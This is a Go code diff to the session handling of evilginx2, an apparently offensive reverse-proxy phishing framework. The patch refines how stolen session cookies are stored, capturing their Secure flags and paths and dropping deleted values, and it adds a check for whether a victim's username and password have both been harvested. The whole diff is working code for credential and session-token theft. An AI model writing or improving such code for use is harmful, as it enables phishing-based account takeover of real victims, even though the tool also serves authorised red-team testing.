@@ -1,6 +1,7 @@
 package core
 
 import (
+	"strings"
 	"time"
 
 	"github.com/kgretzky/evilginx2/database"
@@ -82,21 +83,29 @@ func (s *Session) SetCustom(name string, value string) {
 	s.Custom[name] = value
 }
 
-func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
+func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, secure bool, expires time.Time) {
 	if _, ok := s.CookieTokens[domain]; !ok {
 		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
 	}
 
 	if tk, ok := s.CookieTokens[domain][key]; ok {
+		// Accept the latest value - reject empty/"DELETE" values only
 		tk.Name = key
 		tk.Value = value
-		tk.Path = path
+		if path != "" {
+			tk.Path = path
+		}
 		tk.HttpOnly = http_only
-	} else {
+		tk.Secure = secure
+		return
+	}
+	if value != "" && !strings.EqualFold(value, "DELETE") && !strings.EqualFold(value, "deleted") {
 		s.CookieTokens[domain][key] = &database.CookieToken{
 			Name:     key,
 			Value:    value,
+			Path:     path,
 			HttpOnly: http_only,
+			Secure:   secure,
 		}
 	}
 
@@ -139,6 +148,16 @@ func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAut
 		return true
 	}
 	return false
+}
+
+func (s *Session) AllRequiredCredentialsCaptured(pl *Phishlet) bool {
+	if pl.username.key != nil && s.Username == "" {
+		return false
+	}
+	if pl.password.key != nil && s.Password == "" {
+		return false
+	}
+	return true
 }
 
 func (s *Session) Finish(is_auth_url bool) {
